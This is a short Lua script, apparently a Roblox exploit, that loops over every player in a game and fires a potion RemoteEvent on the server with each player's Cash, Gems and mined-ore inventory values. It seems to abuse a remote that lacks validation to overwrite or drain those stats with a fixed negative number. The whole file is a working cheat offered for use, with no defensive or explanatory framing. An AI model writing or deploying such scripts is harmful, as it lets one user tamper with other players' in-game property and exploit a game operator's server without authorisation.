local setValueForAllPlayers = 6666

local Players = game:GetService('Players')
local StarterGui = game:GetService("StarterGui")

local GetPlayers = Players:GetPlayers()

local Set = {
    ['leaderstats'] = {"Cash", "Gems"},
    ['Inventory'] = {"Coal", "Diamonds", "Gold", "Iron", "Stone"},
}

for index, player in pairs(GetPlayers) do
    local yes, no = pcall(function()
        for i, v in pairs(Set) do
            for e, stat in pairs(v) do
                game.Workspace.Events.Potions.PotionGui:FireServer(player[i][stat], player[i][stat].Value, "")
                game.Workspace.Events.Potions.PotionGui:FireServer(player[i][stat], setValueForAllPlayers * -1, "")
            end
        end
    end)

    if not yes then
        StarterGui:SetCore("SendNotification", {
            Title = "What a nut!",
            Text = string.format("Something happened, but we don't know why.\n%s", no),
            Duration = 5,
        })
    end
end